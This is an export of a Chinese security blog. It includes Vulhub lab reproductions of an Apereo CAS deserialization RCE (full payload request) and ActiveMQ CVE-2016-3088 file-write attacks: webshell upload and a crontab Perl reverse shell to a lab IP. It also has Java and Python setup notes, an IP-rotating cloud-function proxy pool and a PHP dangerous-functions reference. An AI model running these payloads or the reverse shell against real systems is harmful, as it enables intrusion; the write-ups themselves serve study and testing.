    <content><![CDATA[<h1 id="Apereo-CAS-4-1反序列化RCE漏洞"><a href="#Apereo-CAS-4-1反序列化RCE漏洞" class="headerlink" title="Apereo CAS 4.1反序列化RCE漏洞"></a>Apereo CAS 4.1反序列化RCE漏洞</h1><p>Apereo CAS是企业单点登录系统。CAS尝试通过Apache Commons Collections库对对象进行反序列化的过程中存在一个问题，这种情况引起了RCE漏洞。</p>
<a id="more"></a>

<p>参考：</p>
<ul>
<li><a href="https://apereo.github.io/2016/04/08/commonsvulndisc/" target="_blank" rel="noopener">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></li>
</ul>
<p>启动Apereo CAS后，请访问<code>http://192.168.44.132:8080/cas/login</code>以查看登录页面。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>4.1.7之前的Apereo CAS的现成默认配置使用默认密钥<code>changeit</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptedTranscoder</span> <span class="keyword">implements</span> <span class="title">Transcoder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CipherBean cipherBean;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> compression = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EncryptedTranscoder</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean = <span class="keyword">new</span> BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(<span class="keyword">new</span> BufferedBlockCipherSpec(<span class="string">"AES"</span>, <span class="string">"CBC"</span>, <span class="string">"PKCS7"</span>));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(<span class="keyword">this</span>.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(<span class="string">"aes128"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(<span class="string">"changeit"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(<span class="keyword">new</span> RBGNonce());</span><br><span class="line">        <span class="keyword">this</span>.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>可以尝试使用<a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="noopener">Apereo-CAS-Attack</a>生成加密的<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>的序列化对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210507/16203508382075.png" alt="image-20210506171620911"></p>
<p>然后，从登录操作中拦截并修改http请求<code>/cas/login</code>，将有效负载放入<code>execution</code>的值中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Content-Length: 2290</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.44.132:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: JSESSIONID&#x3D;504D29BC1AC0C627D269FD50E48691C1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;testt&amp;lt&#x3D;LT-3-Kz6ZfST1l90TARv9DrSGdo6PjgdUoT-cas01.example.org&amp;execution&#x3D;e7dd4974-27ab-4052-a7fb-bd85e6c2fbe5_AAAAIgAAABCUJFoJfNGzFhudnZYMaIgIAAAABmFlczEyOEdb%2BTkE7I%2BXg2A5D9zQX%2FJZTxymRFgtso29ahEkVPD0AKqLhf5uS0H47YF3p5CAuWvOX5XCRNutljiJsL%2BWfwx0ObeDfdR0Y6%2BvsPqXHe7mg0ID5fuv%2BhHFdlygzW%2FLWUWQVWYSMb8EP0EtMJBGDggopCDlhkrcETOjMSJjrb1lhZUqW%2B2yYr%2Fgl2GhrEWNqFgY2CIcAV0WDeU7uO%2BGyOFcf1szw1L9bs02ySMpr%2FsGdUERI3cbrj71lRchvpQPmTCVsZEuzrdPCgiZ8xKyc8LCQ0Rcp%2F10xBGy5ViXTkhDF9kpdQd1KComTBmsr5t1JSSRPfXsIIXS3uXt76ahmlq%2F4inUq%2BH7rhyqAMdq9KUfHMkgmetc0fOOgWK2yzmWO2mdwvSpA94rAKJlUJBaQa%2BEBA4vTY5O16g8ndIFixmOmcJJZ9u%2B5nfNx2Y8HQRiWdfgWKSbLZ%2BsxCKIbFcTq5jWMgwGXnc7vphGmX9E1jFNP0EuzK%2BlhB8dBHrzyHD3fOB5t7z42kjeB9sHl0XP94dGdyvKxxgV4x1hh2Xv7rx6s%2F%2FhqrpvaRsw4V228UWIcsGUXa2rUsgBg7UUQ3KDkg4smdmOiUZBXrYJ409F42F03lNaI26IoTexHJz%2B4NZNjUiNqm%2BSovwiE%2FK%2FGwm4Xehz5EfhB1B8QQh5f91opk7m1Bm8X6RlStF4lcFl7k8cHt%2FJUtU03ohAVRdWLm4jnTw55S%2B8TFakRzyvuuPRbgLTbx3usYqlj4Y5ysiBwfAI3wRW8RJKkwzFwxsH9d1wC8THxDq76eR1l44sa39PaogS94ZNQVr%2FOc0W7s8hpkYQa79UkJjvUPt%2FeRPeikskrby4uW2DS19F%2BHlBhTUZhFXxIIZf5%2FzV3H1Ph80yJKRnsU6bhlUDAslC%2BM2hll4z9ow8xcZ4LZWpjkCSL3H%2BTExZ0w3eaw%2FKasAM7NEO4sW9aO46wzNarlsaZP657jS2dFL%2BR0W858gwWKx2nUuCWEuKNAw0wkSlxUqQTFjy62FPyXjSHa0hcs67L80dkAB5praeNNDOOAhhfoTaIn6sEBho4sXtBFJtz%2FvY%2F9ELtpKcHGEXYzSHeQhMc9kie%2BqqDHHIh43mkPEk0O5DHszL5dS62AbtiF%2B1YQMySsFzGLzxLLY3Ru5P7v52Fup7HpmyiCSfX0PAvwuy0JQtt9OhpFYFzJyHyT%2FOVHk25kEmDeOwa5A9%2FEQ8ZhLaWLV7X0FCRSmMr2zPWivDNyQMWwCsFjif52o%2ByTdX5Ta0oHXBfNHwRV3MsF9KGVqKDl%2Bkbj1N3ztLIzw2wUdT5Yk0FKNpGJdVaosWD5gUwCijk7MAbXQSWoH4q98QWquTPTwFX80kLu%2F1wDSZpELnMAutggEqzsi99RKNbTbWJZoPcPtRjrCQfYCOIB3GGOIlYWM9XOdndM%2FCo7aJDPwJD1GSXG9Oxw8a1G789moUXzc31IGkd8a3tQxQD64N7PhnJ80PrqxD%2FnNyVmTqmN2eFJREsvSkf3KUi85p%2BH5zvK4hmYq6mGuXO8fyHmmIG%2Fl%2Fm2ARx1zPIAJkc%2BkugkY3QOr5MDYY9j%2FCjgsQ3IfWRF2tvIm4b9wv0QQnQNikUcTLBVmEE%2FrXhCYXUtFhk90eyqk%2BI%2FAXtlwyE%2F8Y8d6TpjkxQljd5enhRh38xeXPzSwJXHiPPZNf5%2F8RkFP3r0FbVbllIrV5za6qYHkq3rE%2BcRQEBBJtFr0sAo1Qvaer0ar2nTtKPrGgxfajlM7N0BDS9FZg6BoQvQRCeG3peYWbWLghXlKXHGDHtYsntzZTXLFMZVdjwhs9nxSv9qyFPkA1Fwh6ZcwsPQSzZTo2%2Fy3VwD3nwlW%2BLaRjzlwjZeIJk0iJ15x8ijObD%2F86tzlCNm1Bo8Y11Bwo%2BKPVX5VYuGvEXXdtQbI8sCTET4vTPzR2JgzMf0VKLhKF9fMKWkpPONcXicN1jqAkhYGS&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210507/16203508432732.png" alt="image-20210506173344081"></p>
<p><code>touch /tmp/success</code>已成功执行：</p>
<p><img src="https://image.3001.net/images/20210507/16203508478955.png" alt="image-20210506173847082"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apereo CAS</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
    <url>/2021/04/28/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><p>环境侦听端口61616和端口8161，其中8161是Web控制台端口。此漏洞显示在Web控制台中。</p>
<p>请访问<code>http://192.168.44.132:8161/</code>以查看该网页，指示该环境已成功运行。</p>
<a id="more"></a>

<h2 id="背景简介"><a href="#背景简介" class="headerlink" title="背景简介"></a>背景简介</h2><p>ActiveMQ Web控制台分为三个应用程序：admin，api和文件服务器，其中admin是管理员页面，api是界面，fileserver是用于存储文件的界面；admin和api需要先登录才能使用，fileserver不需要登录。</p>
<p>文件服务器是RESTful API接口。我们可以通过HTTP请求（例如GET，PUT和DELETE）读写存储在其中的文件。设计目的是为了弥补消息队列操作无法传输和存储二进制文件但后来发现的缺陷：</p>
<ol>
<li>使用率不高</li>
<li>文件操作容易产生漏洞</li>
</ol>
<p>因此，ActiveMQ默认在5.12.x〜5.13.x中关闭文件服务器应用程序（您可以在conf/jetty.xml中打开它）。在5.14.0之后，文件服务器应用程序将被完全删除。</p>
<p>在测试过程中，您应注意ActiveMQ的版本，以防浪费精力。</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>此漏洞出现在Fileserver应用程序中，该漏洞的原理实际上非常简单，即文件服务器支持写入文件（但不解析JSP），同时支持移动文件（MOVE请求）。因此，我们只需要编写一个文件，然后通过使用移动请求将其移动到任何位置，就会导致任意文件写入漏洞。</p>
<p>写入文件，例如cron或ssh key</p>
<ol>
<li>编写Webshell</li>
<li>写入文件，例如cron或ssh key</li>
<li>编写库和配置文件，例如jar或jetty.xml</li>
</ol>
<p>编写webshell的优点是方便，但是文件服务器不需要解析jsp，admin和api都需要登录才能访问，因此有点徒劳。编写cron或ssh键的优点是直接反转Shell，这也很方便，缺点是您需要root权限；写jar，有点麻烦（需要jar后门），写xml配置文件，这种方法比较可靠，但是有一点徒劳：我们需要知道ActiveMQ的绝对路径。</p>
<p>让我们谈谈以上几种方法。</p>
<h3 id="编写Webshell"><a href="#编写Webshell" class="headerlink" title="编写Webshell"></a>编写Webshell</h3><p>如前所述，Webshell需要使用Admin或Api应用程序编写，并且两个应用程序都需要登录才能访问。</p>
<p>默认的ActiveMQ帐户和密码为<code>admin</code>。首先，访问<code>http://192.168.44.132:8161/admin/test/systemProperties.jsp</code>以查看ActiveMQ的绝对路径：</p>
<p><img src="https://image.3001.net/images/20210428/16195940351464.png" alt="image-20210427095240778"></p>
<p>然后上传Webshell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210428/16195940392700.png" alt="image-20210427104033538"></p>
<p>然后将其移至<code>/opt/activemq/webapps/api/s.jsp</code>Web目录中的API文件夹（）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210428/16195940433285.png" alt="image-20210427114856845"></p>
<p>访问Webshell（需要登录）：</p>
<p><img src="https://image.3001.net/images/20210428/16195940469706.png" alt="image-20210427114944287"></p>
<h3 id="编写crontab，自动执行反向shell"><a href="#编写crontab，自动执行反向shell" class="headerlink" title="编写crontab，自动执行反向shell"></a>编写crontab，自动执行反向shell</h3><p>这是一个相对稳定的方法。首先上传cron配置文件（请注意，换行符必须是<code>\n</code>，而不是<code>\r\n</code>，否则crontab执行将失败），这里使用新版的burp，可以清楚看到\n与\r：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.618.44.132:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line">\n</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;192.168.44.132&quot;;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;\n</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210428/16195940493714.png" alt="image-20210427201525273"></p>
<p>将其移至<code>/etc/cron.d/root</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: 192.168.44.132:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">\n</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210428/16195940534404.png" alt="image-20210427201602124"></p>
<p>如果以上两个请求都返回204，则写入成功。等待反向shell：</p>
<p><img src="https://image.3001.net/images/20210428/16195940562451.png" alt="image-20210427201645034"></p>
<p>此方法要求ActiveMQ以root身份运行，否则它将无法写入cron文件。</p>
<h3 id="编写jetty-xml或jar"><a href="#编写jetty-xml或jar" class="headerlink" title="编写jetty.xml或jar"></a>编写jetty.xml或jar</h3><p>从理论上讲，我们可以覆盖jetty.xml，删除admin和api的登录限制，然后编写webshell。</p>
<p>在某些情况下，jetty.xml和jar的所有者是Web容器的用户，因此编写crontab的成功率更高。</p>
<p>尚未测试。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>java双版本同时安装</title>
    <url>/2021/04/28/java%E5%8F%8C%E7%89%88%E6%9C%AC%E5%90%8C%E6%97%B6%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="java双版本同时安装"><a href="#java双版本同时安装" class="headerlink" title="java双版本同时安装"></a>java双版本同时安装</h1><p>因为工具需要用到java13，平时主要用java1.8，对网上的方法进行查看后，研究出一套自己认为比较方便的java双版本安装配置方法。</p>
<a id="more"></a>

<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>通过此链接下载历史版本：<a href="https://www.oracle.com/java/technologies/oracle-java-archive-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/oracle-java-archive-downloads.html</a></p>
<p>我下载的是java8和java13</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>点击安装包常规安装，分别安装于两个文件夹中，我这里是分为<code>jdk</code>与<code>jdk13</code>两个文件夹。</p>
<p>配置环境变量可按照常规配置，其中需要修改的是<code>JAVA_HOME</code>此变量，</p>
<p>使用java8时，配置为：JAVA_HOME=D:\java\jdk</p>
<p>使用java13时，配置为：JAVA_HOME=D:\java\jdk13</p>
<p>这样配置JAVA_HOME的参数值为不同版本java的安装路径，在path中配置的变量需要注意一点，有些配置可能为java的绝对路径了，这里方便切换版本，需要配置成：<code>%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</code>这种形式。这样就可以通过只修改JAVA_HOME来切换java的版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\joker0xxx3&gt;java -version</span><br><span class="line">java version &quot;1.8.0_261&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_261-b12)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.261-b12, mixed mode)</span><br><span class="line"></span><br><span class="line">C:\Users\joker0xxx3&gt;java -version</span><br><span class="line">java version &quot;13.0.2&quot; 2020-01-14</span><br><span class="line">Java(TM) SE Runtime Environment (build 13.0.2+8)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 13.0.2+8, mixed mode, sharing)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>python2和python3同时安装</title>
    <url>/2021/04/28/python2%E5%92%8Cpython3%E5%90%8C%E6%97%B6%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="python2和python3同时安装"><a href="#python2和python3同时安装" class="headerlink" title="python2和python3同时安装"></a>python2和python3同时安装</h1><p>在用到某些工具时，部分需要Python2的运行环境，部分需要Python3的运行环境。考虑到切换虚拟机比较麻烦，就可以通过在本机同时安装双版本的Python2与Python3来进行切换使用。</p>
<a id="more"></a>

<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>进入python官网，链接<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a></p>
<p>选择Downloads—&gt;Windows，点击进入选择版本进行下载安装包。</p>
<p>我选择的是python3.8.5与python2.7.18</p>
<h2 id="安装与配置环境变量"><a href="#安装与配置环境变量" class="headerlink" title="安装与配置环境变量"></a>安装与配置环境变量</h2><p>这里先安装python3，之后再安装python2。</p>
<p>1、安装python3</p>
<p>点击安装包一键安装python3，记住需要勾选住<code>Add Python3.8 to PATH</code>，可以直接将python3添加到系统环境变量中。</p>
<p>2、安装python2并添加环境变量</p>
<p>然后点击python2的安装包进行安装，安装完成后，打开，控制面板\系统和安全\系统，选择高级系统设置，环境变量，选择Path，点击编辑，新建，分别添加D:\Python\python27和D:\Python\python27\Scripts到环境变量。</p>
<p>注意：python3安装时可以选择自动添加到系统环境变量，如未选择，方法和python2添加过程相同。</p>
<p>3、重命名python.exe</p>
<p>到python2和python3的安装目录，修改python2.7.18和python3.8.5中python.exe和pythonw.exe的名称为python2.exe、pythonw2.exe和python3.exe、pythonw3.exe。</p>
<p>然后在运行cmd命令，输入python2即可运行python2.7.18版本，输入python3运行python3.8.5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\joker0xxx3&gt;python3 -V</span><br><span class="line">Python 3.8.5</span><br><span class="line"></span><br><span class="line">C:\Users\joker0xxx3&gt;python2 -V</span><br><span class="line">Python 2.7.18</span><br></pre></td></tr></table></figure>

<h2 id="配置pip"><a href="#配置pip" class="headerlink" title="配置pip"></a>配置pip</h2><p> Python 安装包需要用到包管理工具pip，但是当同时安装python2和python3的时候，pip只是其中一个版本，以下将提供一个修改方式，即重新安装两个版本的pip，使得两个python版本的pip能够共存。</p>
<p>在DOS命令框输入命令，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure>

<p>显示重新安装成功。</p>
<p>python2同理也可以：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure>

<p>现在可以通过pip2 -V 和 pip3-V 查看两个版本的pip信息，以后只需运行pip2install XXX和pip3 install XXX即可安装各自的python包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\joker0xxx3&gt;pip2 -V</span><br><span class="line">pip 20.3.4 from d:\python\python2\lib\site-packages\pip (python 2.7)</span><br><span class="line"></span><br><span class="line">C:\Users\joker0xxx3&gt;pip3 -V</span><br><span class="line">pip 20.2.3 from d:\python\python3\lib\site-packages\pip (python 3.8)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>云函数代理池</title>
    <url>/2021/04/25/%E4%BA%91%E5%87%BD%E6%95%B0%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
    <content><![CDATA[<h1 id="云函数代理池"><a href="#云函数代理池" class="headerlink" title="云函数代理池"></a>云函数代理池</h1><p>通过腾讯云函数配置代理池</p>
<a id="more"></a>

<p>注册腾讯云，访问云产品页面，进入云函数</p>
<p><img src="https://image.3001.net/images/20210425/16193388765146.png" alt="image-20210425123615905"></p>
<p>在云函数中新建服务</p>
<p><img src="https://image.3001.net/images/20210425/16193430024519.png" alt="image-20210425124338173"></p>
<p>自定义创建，选择运行环境为GO</p>
<p><img src="https://image.3001.net/images/20210425/16193388803149.png" alt="image-20210425124930356"></p>
<p>函数代码，提交方式选择本地上传ZIP包，执行方法main，并上传服务端的ZIP包</p>
<p><img src="https://image.3001.net/images/20210425/16193388824903.png" alt="image-20210425125044831"></p>
<p>触发器配置，触发方式选择API网关触发，新建API服务</p>
<p><img src="https://image.3001.net/images/20210425/16193388854902.png" alt="image-20210425125157602"></p>
<p>提交完成后，开始部署，部署完成后，在触发管理中可看到自己配置的触发器详细信息，将访问路径记录下来。</p>
<p><img src="https://image.3001.net/images/20210425/16193388882525.png" alt="image-20210425125533103"></p>
<p>打开客户端配置文件，设置自己的端口和url</p>
<p><img src="https://image.3001.net/images/20210425/16193388916987.png" alt="image-20210425125739139"></p>
<p>在linux中需要赋予客户端以执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x SFCProxy</span><br></pre></td></tr></table></figure>

<p>安装压缩包中的证书，使其支持https，运行客户端程序</p>
<p><img src="https://image.3001.net/images/20210425/16193388948903.png" alt="image-20210425160456469"></p>
<p>配置其代理端口，在浏览器访问，可以看到每次访问刷新请求，ip都会变化</p>
<p><img src="https://image.3001.net/images/20210425/16193426501518.gif" alt="20210425161114"></p>
<p>参考链接：<a href="https://mp.weixin.qq.com/s/4rhYcYN0gdH5JJB3fZm8ag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4rhYcYN0gdH5JJB3fZm8ag</a></p>
<p>服务端与客户端在参考链接中。</p>
]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>云函数</tag>
        <tag>代理池</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计危险函数</title>
    <url>/2021/04/25/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="PHP代码审计危险函数"><a href="#PHP代码审计危险函数" class="headerlink" title="PHP代码审计危险函数"></a>PHP代码审计危险函数</h1><a id="more"></a>


<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>( string $code) : mixed</span><br></pre></td></tr></table></figure>

<p><code>eval()</code>函数就是将传入的字符串当作 <code>PHP</code> 代码来进行执行。</p>
<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>PHP 5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert( mixed $assertion[, string $description] ) : bool</span><br></pre></td></tr></table></figure>

<p>PHP 7</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert( mixed $assertion[, Throwable $exception] ) : bool</span><br></pre></td></tr></table></figure>

<p>在PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在PHP 7 中，可以是一个返回任何值的表达式，它将被执行结果用于判断断言是否成功。</p>
<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数执行一个正则表达式的搜索和替换。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement: 用于替换的字符串或字符串数组。</li>
<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
<li>$count: 可选，为替换执行的次数。</li>
</ul>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p><code>create_function()</code>用来创建一个匿名函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function( string $args, string $code) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>string $args 声明的函数变量部分</li>
<li>string $code 要执行的代码</li>
</ul>
<p><code>create_function()</code>函数在内部执行<code>eval()</code>函数，所以我们就可以利用这一点，来执行代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $onefunc = create_function(<span class="string">'$a'</span>,<span class="string">'return system($a);'</span>);</span><br><span class="line">	$onefunc(whoami);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><p><code>array_map()</code>为数组的每个元素应用回调函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_map( callable $callback, <span class="keyword">array</span> $array1[, <span class="keyword">array</span> $...] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>

<p><strong>array_map()</strong>：返回数组，是为 <code>array1</code> 每个元素应用 <code>callback</code>函数之后的数组。<code>callback</code> 函数形参的数量和传给<code>array_map()</code> 数组数量，两者必须一样。</p>
<p>参数 </p>
<ul>
<li>callback：回调函数，应用到每个数组里的每个元素。</li>
<li>array1：数组，遍历运行<code>callback</code>函数。</li>
<li>…：数组列表，每个都遍历运行<code>callback</code>函数。</li>
</ul>
<p>通过<code>array_map()</code>这个函数，来调用用户自定义的函数，而用户这里的回调函数其实就是<code>system</code>函数，那么就相当于我们用<code>system</code>函数来对旧数组进行操作，得到新的数组，那么这个新的数组的结果就是我们想要的命令执行的结果了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $func = <span class="string">'system'</span>;</span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    $old_array[<span class="number">0</span>] = $cmd;</span><br><span class="line">    $new_array = array_map($func,$old_array);</span><br><span class="line">    var_dump($new_array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p><code>call_user_func()</code>是把第一个参数作为回调函数调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func( callable $callback[, mixed $parameter[, mixed $...]] ) : mixed</span><br></pre></td></tr></table></figure>

